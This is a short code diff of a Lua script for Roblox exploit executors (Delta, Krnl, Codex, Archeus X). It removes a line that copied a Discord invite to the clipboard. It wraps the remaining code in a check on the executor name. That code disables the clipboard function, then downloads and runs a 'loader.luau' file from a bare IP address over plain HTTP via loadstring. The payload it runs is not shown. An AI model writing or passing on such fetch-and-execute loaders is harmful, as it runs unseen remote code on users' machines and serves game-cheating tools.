@@ -1,4 +1,17 @@
-setclipboard("Join discord.gg/TEtsMgy2Xh and write /generate")
+if identifyexecutor and (
+    identifyexecutor() == "Delta" or 
+    identifyexecutor() == "Krnl" or
+    identifyexecutor() == "Codex" or
+    identifyexecutor() == "Archeus X"
+) then
+    
+    
 setclipboard = function() return end
 ID="6710c962-7192-471b-8f42-cf9a1a8c4ab5";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+
+else
+    
+    
+
+end
